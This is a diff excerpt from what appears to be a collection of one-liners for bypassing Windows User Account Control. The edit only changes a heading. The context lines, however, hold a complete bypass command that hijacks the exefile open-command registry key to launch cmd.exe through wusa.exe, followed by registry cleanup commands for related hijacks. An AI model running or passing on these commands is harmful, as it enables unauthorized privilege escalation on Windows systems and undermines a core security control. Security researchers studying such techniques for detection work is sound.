@@ -71,7 +71,7 @@ Collection of one-liners to bypass User Account Control (UAC) in Windows. These 
   reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\exefile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && wusa.exe                                                                                                                                                                                
    ```
   ---                                                                                                                                                                                         
-  Reset (All)                                               
+  ## Reset (All)                                               
 ```
   reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
   reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f                                                                                                                        
